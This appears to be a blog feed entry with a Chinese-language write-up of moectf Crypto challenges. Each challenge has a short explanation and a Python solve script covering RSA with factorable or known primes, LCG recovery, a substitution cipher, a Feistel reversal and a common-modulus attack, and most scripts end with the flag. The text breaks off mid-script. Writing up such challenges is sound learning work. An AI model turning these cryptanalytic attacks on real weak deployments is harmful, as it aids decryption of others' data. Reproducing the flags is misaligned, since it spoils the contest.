        <content type="html"><![CDATA[<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="beginOfCrypto"><a href="#beginOfCrypto" class="headerlink" title="beginOfCrypto"></a><em><strong>beginOfCrypto</strong></em></h2><blockquote><blockquote><p>看一下代码~<br>ord是把flag的每一个字符转成数字，map则是一个用来迭代的函数，也就是对flag里的每一个字符ord，list转成列表之后存进data列表里。之后的for循环把data列表里的数字取e的指数，并把结果存在cip列表里。<br>知道加密过程之后就很简单了~我们只需要把cip取e的对数，然后转成字符输出就可以了~    <del>第一题真是很温柔呢</del></p></blockquote></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line">cip=[<span class="number">2.178203880729008e+47</span>, <span class="number">1.6094870669615087e+48</span>, <span class="number">7.307059979368028e+43</span>, <span class="number">9.889030319346894e+42</span>, <span class="number">2.3886906014249767e+50</span>, <span class="number">1.9862648361376436e+44</span>,</span><br><span class="line"> <span class="number">2.6195173187490456e+53</span>, <span class="number">9.889030319346894e+42</span>, <span class="number">7.016735912097614e+20</span>, <span class="number">2.178203880729008e+47</span>, <span class="number">7.307059979368028e+43</span>, <span class="number">1.811239082889014e+41</span>,</span><br><span class="line"> <span class="number">1.6094870669615087e+48</span>, <span class="number">5.920972027664636e+47</span>, <span class="number">214643579785915.7</span>, <span class="number">3.6379709476087856e+42</span>, <span class="number">7.307059979368028e+43</span>, <span class="number">5.399227610580139e+44</span>,</span><br><span class="line"> <span class="number">3.989519570547194e+45</span>, <span class="number">5.920972027664636e+47</span>, <span class="number">1.811239082889014e+41</span>, <span class="number">3.5451311827611436e+52</span>, <span class="number">1.6094870669615087e+48</span>, <span class="number">6.493134255664421e+50</span>,</span><br><span class="line"> <span class="number">3.23274119108484e+49</span>, <span class="number">1.811239082889014e+41</span>, <span class="number">1.2523631708422093e+29</span>, <span class="number">3.23274119108484e+49</span>, <span class="number">3.5451311827611436e+52</span>, <span class="number">4.375039447261315e+48</span>,</span><br><span class="line"> <span class="number">2.3886906014249767e+50</span>, <span class="number">7.016735912097614e+20</span>, <span class="number">1.811239082889014e+41</span>, <span class="number">9.889030319346894e+42</span>, <span class="number">3.831008000716566e+22</span>, <span class="number">3.23274119108484e+49</span>,</span><br><span class="line"> <span class="number">1.4093490824269349e+22</span>, <span class="number">1.4093490824269349e+22</span>, <span class="number">3.23274119108484e+49</span>, <span class="number">1.9355760420357097e+54</span>]</span><br><span class="line">flag=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cip)):</span><br><span class="line">    flag.append(math.log(cip[i],math.e))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(i)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#moectf&#123;c0me_on!begin_your_Crypt0_c4r33r&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p><em><strong>BabyMultiple</strong></em></p><blockquote><p>看代码，大概意思就是把flag用encode函数进行了一次加密。跟第一题一样，逆向去写解密脚本就好了~<br> <del>不过由于懒得动脑子了，</del> 可以观察一下，这个题是属于单字符加密，也就是一个明文字符对应一个确定的密文字符，所以我们可以直接把所有字符的加密结果都打印出来，然后在里边找我们需要的字符就好了。<br> 这里我把所有字符的加密后结果放在cyberlist里。</p></blockquote></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">table = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_&#x27;</span></span><br><span class="line">cyberlist=<span class="built_in">list</span>(<span class="string">&quot;a61WRMHCxsnid94ZUPKFAvqlgb72XSNIDytoje_50VQLGBwrmhc83YTOJEzupkf&quot;</span>)</span><br><span class="line">flag=<span class="string">&#x27;g3AfJPOfHPOJFfJuf_AYux1JFx39&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    j=cyberlist.index(i)</span><br><span class="line">    <span class="built_in">print</span>(table[j],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#y0u_4r3_gr34t_47_Mu17ic4ti0n</span></span><br></pre></td></tr></table></figure><blockquote><p><em><strong>LazyRSA</strong></em></p><blockquote><p>一个简单的RSA加密<br>求(p-1)*(q-1)的逆元可以用gmpy2库的invert，然后pow一下就好了<br><del>by the way: 这两个库真难装······</del></p></blockquote></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p =  <span class="number">7049120988661090136959367990211624032671088374397430253722914704672269343351268486642692858477617370573493581346846411168539408811542592351582581576539221</span></span><br><span class="line">q =  <span class="number">11595461299251293002401295606096202123601375776115430944343338141843770078346355504245510150744085418550473572002573306023521368183889972175846278163010889</span></span><br><span class="line">c =  <span class="number">48425576447741107904942007362859939933300480519833273210397511573241220126734053813936424490872852942885069257318462762079636783871415500644717758273774268724488497979368196170897933989184449432995120246590652553995031347596620505647525475638040859263109628716173897321613612254357251120398449111747305089380</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">flag=<span class="built_in">pow</span>(c,gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>)),p*q)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br><span class="line"><span class="comment">#moectf&#123;w0w_yOU_Know_h0w_70_d3crypt_th3_RSA&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p><em><strong>PRintNewG</strong></em></p><blockquote><p><del>做的最痛苦的一道题······</del><br>观察一下代码，是要解一个方程组，假设flag是m0的话，那么就是要解如下方程组：<br>(am0+b)%n=m1<br>(am1+b)%n=m2<br>(am2+b)%n=m3<br>这里要了解一下乘法逆元的概念。<br>方程ax%n=1,那么求x就叫求a关于n的乘法逆元。<br>而对ay%n=m，求出a关于n的乘法逆元后再乘以m模n即可。<br>此处的b可以用两个方程组相减来消去b，得到如下两个方程：<br>a(m0-m1)%n=m2-m1<br>a(m2-m1)%n=m2-m3<br>那么就可以直接当成二元方程组求解即可。</p></blockquote></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n=<span class="number">164955381960104851576442781839629371483790790743830073857213053104860144345367</span></span><br><span class="line">m1=<span class="number">67066424717605861916529090048670931008913194546199003522357504998012803616537</span></span><br><span class="line">m2=<span class="number">14585402872351563180055857554749250191721167730349724393021149201170995608751</span></span><br><span class="line">m3=<span class="number">68393939370424772490169906192546208899639826391163845848999554903218827210979</span></span><br><span class="line"></span><br><span class="line">a=(gmpy2.invert(m2-m1,n))*(m3-m2)%n</span><br><span class="line">m=((gmpy2.invert(a,n))*(m1-m2)+m1)%n</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#moectf&#123;PR1nt_N3w_G_s0_e45y&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p><em><strong>NumberTheory-FeeeeeMa</strong></em></p><blockquote><p>~~虽然叫费马，但考的还是RSA~~~<br>扔到kafu里分解一下n：<br>PRP617 = 19283057560629238193074608948196301223350201847222196402737537143121425317730486716068722286654190001952369093090081343313799571068008460938887101338032695456530086089154736812933510497087528596022484804860301935123425283243570950209590727297843775205178712560791816849702359490660765666544417910788968742654156070723140800392112743461501566752095206321903852202148826414101280864051684149726194087223728037750495558021865046068965219079941837883220009399934492981566439903512479087624251270587165899645259193043162046541946253111129504269329740364176081037121431605940093408252027961675192279921542388792148531562041<br>PRP617 = 19283057560629238193074608948196301223350201847222196402737537143121425317730486716068722286654190001952369093090081343313799571068008460938887101338032695456530086089154736812933510497087528596022484804860301935123425283243570950209590727297843775205178712560791816849702359490660765666544417910788968742654156070723140800392112743461501566752095206321903852202148826414101280864051684149726194087223728037750495558021865046068965219079941837883220009399934492981566439903512479087624251270587165899645259193043162046541946253111129504269329740364176081037121431605940093408252027961675192279921542388792148531561919<br>直接上手：</p></blockquote></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c=<span class="number">5883797662470459824355663245986072888499217007658131616834157815812099907584034205088255553387720712715657503553785084616903197734118992506040765948815581238738585159640841277023597023582148173041980600751980206228524475872232080917683822098342300418744639304147771013376863895727877847094151770079046205501266017838881847833528612089868825489776289686550273385136080255799772961155599801690997753649087689949021276549323525754963020408864310302166537661098308581259246052869844362142747080042122189010627048397501817473817946566885487595098504403459522534124404289032779842658407728856164570059823567667669076044563549721918886430160041337156249733571322684187916005175717585587552966989348534775572282369273898182367851689305440672199427492706130124832744127722533758962606513875787129378871099575729793745175327897215145024490319291830298017471555440811147903390803597635585696411407922981136489077349754222355529320548946411677051716584081079246752768224289803323109047467790868885987703125118276891234633889937243303027095375365791207055516900563280115276282761652663098154769929217653527103304045922204641545963828632051715956492613217136463227530538723452005224696385225174844198627387638874395654771260577791169209134146482</span></span><br><span class="line">p=<span class="number">19283057560629238193074608948196301223350201847222196402737537143121425317730486716068722286654190001952369093090081343313799571068008460938887101338032695456530086089154736812933510497087528596022484804860301935123425283243570950209590727297843775205178712560791816849702359490660765666544417910788968742654156070723140800392112743461501566752095206321903852202148826414101280864051684149726194087223728037750495558021865046068965219079941837883220009399934492981566439903512479087624251270587165899645259193043162046541946253111129504269329740364176081037121431605940093408252027961675192279921542388792148531562041</span></span><br><span class="line">q=<span class="number">19283057560629238193074608948196301223350201847222196402737537143121425317730486716068722286654190001952369093090081343313799571068008460938887101338032695456530086089154736812933510497087528596022484804860301935123425283243570950209590727297843775205178712560791816849702359490660765666544417910788968742654156070723140800392112743461501566752095206321903852202148826414101280864051684149726194087223728037750495558021865046068965219079941837883220009399934492981566439903512479087624251270587165899645259193043162046541946253111129504269329740364176081037121431605940093408252027961675192279921542388792148531561919</span></span><br><span class="line">flag=<span class="built_in">pow</span>(c,gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>)),p*q)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br><span class="line"><span class="comment">#moectf&#123;y0u_c4n_e4s1ly_f4ctor_th3_N&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>BBBBBBBackpack</p><blockquote><p>不是很懂背包，这个题倒着依次乘一下加回去就好了。<br><del>我也不知道什么背包问题？？？</del></p></blockquote></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag=<span class="number">0</span></span><br><span class="line">backpack=[<span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">23</span>, <span class="number">81</span>, <span class="number">199</span>, <span class="number">670</span>, <span class="number">1844</span>, <span class="number">5535</span>, <span class="number">19547</span>, <span class="number">75437</span>, <span class="number">259056</span>, <span class="number">974664</span>, <span class="number">2399609</span>, <span class="number">7304021</span>, <span class="number">18537736</span>, <span class="number">38733276</span>, <span class="number">143785607</span>, <span class="number">300890806</span>, <span class="number">778420517</span>, <span class="number">3112554961</span>, <span class="number">9955080778</span>, <span class="number">34625138877</span>, <span class="number">103531993246</span>, <span class="number">294207209833</span>, <span class="number">632363887456</span>, <span class="number">2341888528510</span>, <span class="number">8736224869982</span>, <span class="number">33727228149167</span>, <span class="number">113026240109398</span>, <span class="number">334534210335245</span>, <span class="number">754812282783351</span>, <span class="number">2871232541211362</span>, <span class="number">7147990367228081</span>, <span class="number">16813142520913249</span>, <span class="number">62232346665698392</span>, <span class="number">132813746566508109</span>, <span class="number">436969187287191174</span>, <span class="number">1371311321857557068</span>, <span class="number">3465499917202578303</span>, <span class="number">10761115866584374884</span>, <span class="number">25998484366411649657</span>, <span class="number">81986464388691181616</span>, <span class="number">324842980726420787162</span>, <span class="number">1063428202306999892763</span>, <span class="number">3318046410585817603032</span>, <span class="number">12569059003729082352479</span>, <span class="number">29822650425811094387624</span>, <span class="number">89829868596281155601134</span>, <span class="number">207467076929560545986692</span>, <span class="number">424101883375592006882573</span>, <span class="number">1410057940679583010646572</span>, <span class="number">4795250448769489602371933</span>, <span class="number">12419955465903295439689190</span>, <span class="number">32127052925660652338148413</span>, <span class="number">121768246803017981541739592</span>, <span class="number">286293639144639999224246905</span>, <span class="number">876618562849333372078886060</span>, <span class="number">3495370549956845610130431964</span>, <span class="number">13777448384830441398471073019</span>, <span class="number">45339968634224370226443992856</span>, <span class="number">159636974047457043534720001443</span>, <span class="number">403806399587759901542286515690</span>, <span class="number">1190949464093267805434271517577</span>, <span class="number">2625636206558220580206955200643</span>, <span class="number">5447410189447132699195152662348</span>, <span class="number">13798370097217657917056458399390</span>, <span class="number">42652195271813913821236091812630</span>, <span class="number">87624112365004035907264763291796</span>, <span class="number">295833079631922620770335225824586</span>, <span class="number">717255284196409248439771704866883</span>, <span class="number">2119024457898120787521595829459142</span>, <span class="number">8097762744600097674390735606807128</span>, <span class="number">22990496332708170421088808438995636</span>, <span class="number">55268619563994680834441597248247582</span>, <span class="number">157779112538179073738464223501777499</span>, <span class="number">553561084981889545670380643023607621</span>, <span class="number">2094594867042850711386606235023415160</span>, <span class="number">7427564397983932982484534762285032864</span>, <span class="number">28541899514275079822011638819911534081</span>, <span class="number">59854615377110931361953157015440306520</span>, <span class="number">137071568336121640486639449884477676903</span>, <span class="number">434368553369190183317274206512577489165</span>, <span class="number">1607515956833802196435755021284640023303</span>, <span class="number">4247439813046769661567823675143526066989</span>, <span class="number">12252982336388472725165513300377051313644</span>, <span class="number">43586970358791422986656986286232849952290</span>, <span class="number">94754002216262928157061686798919700234151</span>, <span class="number">205403633516427560050027271636224615375855</span>, <span class="number">727922215919878343821825296552148942903123</span>, <span class="number">1541646353685774868780093433673052445519807</span>, <span class="number">5703469721749658936787093922654529457118594</span>, <span class="number">20762100689139896330208273986505541316962105</span>, <span class="number">80195197197818086812949239946286778357513961</span>, <span class="number">198522126001869063688321920177617046841212852</span>, <span class="number">719060816608760633741229682178956301630549900</span>, <span class="number">2171712751463320729665634385979825928332317622</span>, <span class="number">7968526190188064156742281507099763347000210904</span>, <span class="number">20302513556821857703528100337806260797703562338</span>, <span class="number">54967103106163860243927426134510653397499429384</span>, <span class="number">189866376897538250029834405810321956080892995934</span>, <span class="number">516088075785491414669664215795496674103100750375</span>, <span class="number">1531616665488077085604100033058238685259376456655</span>, <span class="number">4795563798371064843556375420641263389159268373753</span>, <span class="number">12715206263244537077480789152826620386135239585589</span>, <span class="number">45628223673569886022145657218662773486560769778049</span>, <span class="number">127988774487590162169660910342623736153210927472871</span>, <span class="number">429761810968391607465089641939438991272623610573254</span>, <span class="number">1694286408402338132220805654166083638884822137745848</span>, <span class="number">5577419986858786911316434594350519553014729018524982</span>, <span class="number">22146179230778265190752372551893625479326089828877879</span>, <span class="number">78983119075073724439850825731329386811892547014513513</span>, <span class="number">165805826557531832743325076551678254671357810872202277</span>, <span class="number">525687524776397669648788242907896052104054917192402349</span>, <span class="number">1596680185629512867035574394423929715498386636216930988</span>, <span class="number">3808351509446054183279144714875260973968494634290203802</span>, <span class="number">10792542598439044383994436390450612942036864538927761344</span>, <span class="number">31776077718298264756461043701077481610506447838959767949</span>, <span class="number">69483787236434708634666641366101673156349500969799745632</span>, <span class="number">212620878051727200345257734337176214877612639791408110401</span>, <span class="number">565705372069455623425268706185184158331866127768259060570</span>, <span class="number">2228971348185635371906791535156337404926063871528397270892</span>, <span class="number">4859328204121938264839760465087547752629065763656619388434</span>, <span class="number">14185348803209161448182653444177464165713091554806223414499</span>, <span class="number">44242932119616103779840255273986809836494122475150635493273</span>, <span class="number">156176016196847319874949580221731690886061627436916661422852</span>, <span class="number">472567672907289753186461661432798790751774534772655287936877</span>, <span class="number">1765317440470718113352833182911767208733594355879647245836603</span>, <span class="number">5835719030771522391675663002032404790451900100534570526468736</span>, <span class="number">14528961633147270325279483890277955669830128461595478399405580</span>, <span class="number">53503137764341373520101774208921450303897226002280491351371881</span>, <span class="number">153340302591307960181257267214621247064964249027062324798966650</span>, <span class="number">467036429085212303265974827129085622046910166509299763268535756</span>, <span class="number">1760478013800716951650816419888923889893355872867499404847043361</span>, <span class="number">4791886951911545137378952129838133145784256723738609871941913863</span>, <span class="number">19126760116038883506408830737976498053029475253123685318001466609</span>, <span class="number">51635927378821965754946959553487670084314385367430813170544188707</span>, <span class="number">203944552994591250724882161307279862158139878326498083669171922709</span>, <span class="number">718868928147325949276701359623063723395455731358210896767864810436</span>, <span class="number">2005627527854915017699090052821431775394584514441537184407714355949</span>, <span class="number">6108484926321410509000933490330125849664844216966621898372849074206</span>, <span class="number">15273733259375332107091552084526951416159646708621190826219429490015</span>, <span class="number">34145117254940196604842578208457005181132408450899191627170638987883</span>, <span class="number">120825229084143066199868275091825674337472013226784591902132114229359</span>, <span class="number">387687667198606192147021527980207738864855944986764666796629571317797</span>, <span class="number">1461874344207808204456192497546273455901754164965322967295868406627707</span>, <span class="number">3258300231591322626530795072101331694347928535549768492906530809069244</span>, <span class="number">8874418273687545553519370439384854004509761935319681848589844232674343</span>, <span class="number">26555971104148502495508475192114409958713364020252024170586326291995544</span>, <span class="number">56653286369586527413345416396708661964062474995701742952261047069623359</span>, <span class="number">154383566127721041301459355493059400704799197964228029280865862358894596</span>, <span class="number">341393868848806018386217706353404785528207249510734290203621418976352706</span>, <span class="number">1171362524761660822765817023463786914069613269413196584856696440695273738</span>, <span class="number">4194882148022101614597714583113090146333385168895367467002069867303753334</span>, <span class="number">10081717223153632058965668126630772845024206141591578024505075742926631137</span>, <span class="number">39590555580101758090745061229221178837429140073072263518741551403983751377</span>, <span class="number">124978669991117804453179514660098523434116842472570073354436333226196401318</span>, <span class="number">285677744249355467333640461312079508294900634926466871637187648581093663108</span>, <span class="number">685643590088926190360498081484403342771108281930489395367499236756131358960</span>, <span class="number">2509513194338799699151211958956210034789618340347017416940796124375457114430</span>, <span class="number">7869725510782496795692771133398729561144872690341264618424961946628895219979</span>]</span><br><span class="line">l_list=[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>]</span><br><span class="line">l_list=l_list[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(l_list)):</span><br><span class="line">    flag=flag+l_list[i]*backpack[i]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br></pre></td></tr></table></figure><blockquote><p><em><strong>FesitelTripple</strong></em></p><blockquote><p><del>有点像DES，可惜不是，但是差不太多emmm</del><br><del>其实没太看懂，瞎改了一通反正跑出来了（bushi</del><br>DES里的加密和解密最后一轮是不会左右互换的，但是这里最后一轮还会互换，并且密钥依次用了keysteam里的16位<br>那么把range改成倒着来的，然后解密换成加密，加密换成解密就好了</p></blockquote></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">plaintext, keystream</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(plaintext) == <span class="number">32</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(keystream) == <span class="number">48</span></span><br><span class="line"></span><br><span class="line">    left = plaintext[:<span class="number">16</span>]</span><br><span class="line">    right = plaintext[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        </span><br><span class="line">        aes = AES.new(keystream[i * <span class="number">16</span>:i * <span class="number">16</span> + <span class="number">16</span>], AES.MODE_ECB)</span><br><span class="line">        new_right = long_to_bytes(bytes_to_long(aes.encrypt(right)) ^ bytes_to_long(left))</span><br><span class="line">        new_left = right</span><br><span class="line">        left = new_left</span><br><span class="line">        right = new_right</span><br><span class="line">    <span class="keyword">return</span> left + right</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">ciphertext, keystream</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(ciphertext) == <span class="number">32</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(keystream) == <span class="number">48</span></span><br><span class="line"></span><br><span class="line">    left = ciphertext[:<span class="number">16</span>]</span><br><span class="line">    right = ciphertext[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        </span><br><span class="line">        aes = AES.new(keystream[i * <span class="number">16</span>:i * <span class="number">16</span> + <span class="number">16</span>], AES.MODE_ECB)</span><br><span class="line">        old_right = left</span><br><span class="line">        old_left = long_to_bytes(bytes_to_long(right) ^ bytes_to_long(aes.encrypt(old_right)))</span><br><span class="line">        left = old_left</span><br><span class="line">        right = old_right</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> left + right</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cipher=long_to_bytes(<span class="number">8465484536296110246056264738507061716988653458463168290845919961738127701895</span>)</span><br><span class="line">key1 = <span class="string">b&#x27;it_is_just_the_first_time_key_and_encrypt_twice~&#x27;</span></span><br><span class="line">key2 = <span class="string">b&#x27;y0u can d0 what y0u w4nt t0 do!Go0d wishes~do it&#x27;</span></span><br><span class="line"></span><br><span class="line">cipher = decrypt(cipher, key1)</span><br><span class="line">cipher = encrypt(cipher, key2)</span><br><span class="line">flag = decrypt(cipher, key1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#moectf&#123;th3_f3sit3l_1s_symmetric&#125;</span></span><br></pre></td></tr></table></figure><blockquote><blockquote><p><em><strong>NumberTheory-Powwwwwer</strong></em></p><blockquote><p>是RSA一种常见的攻击方式：共模攻击。<br><del>其实是网上嫖的代码QAQ</del></p></blockquote></blockquote></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e1 = <span class="number">0x114514</span></span><br><span class="line">e2 = <span class="number">11451401</span></span><br><span class="line">n = <span class="number">136101507305579392638535644920761633964164170724862786826983346232384615490056114520867809528578619044234996682189743771790469301482774597055261893015794231752161620186891313083697906603842794202124169703689691049507643124840305144271549786654248958903748746153284903228556081709492696702282014035715848536699</span></span><br><span class="line"></span><br><span class="line">c1=<span 